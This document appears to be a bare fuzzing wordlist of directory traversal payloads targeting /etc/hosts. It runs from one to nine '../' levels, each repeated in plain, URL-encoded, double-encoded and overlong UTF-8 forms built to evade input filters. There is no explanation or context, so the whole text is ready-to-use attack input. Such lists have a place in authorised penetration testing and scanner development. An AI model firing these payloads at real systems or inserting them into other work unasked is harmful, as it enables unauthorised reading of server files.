../etc/hosts
%2e%2e%2fetc%2fhosts
%252e%252e%252fetc%252fhosts
%2e%2e%c0%afetc%c0%afhosts
%252e%252e%25c0%25afetc%25c0%25afhosts
../../etc/hosts
%2e%2e%2f%2e%2e%2fetc%2fhosts
%252e%252e%252f%252e%252e%252fetc%252fhosts
%2e%2e%c0%af%2e%2e%c0%afetc%c0%afhosts
%252e%252e%25c0%25af%252e%252e%25c0%25afetc%25c0%25afhosts
../../../etc/hosts
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts
%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afhosts
%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25afetc%25c0%25afhosts
../../../../etc/hosts
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts
%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afhosts
%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25afetc%25c0%25afhosts
../../../../../etc/hosts
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts
%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afhosts
%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25afetc%25c0%25afhosts
../../../../../../etc/hosts
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts
%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afhosts
%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25afetc%25c0%25afhosts
../../../../../../../etc/hosts
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts
%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afhosts
%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25afetc%25c0%25afhosts
../../../../../../../../etc/hosts
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts
%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afhosts
%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25afetc%25c0%25afhosts
../../../../../../../../../etc/hosts
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts
%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afhosts
%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25af%252e%252e%25c0%25afetc%25c0%25afhosts
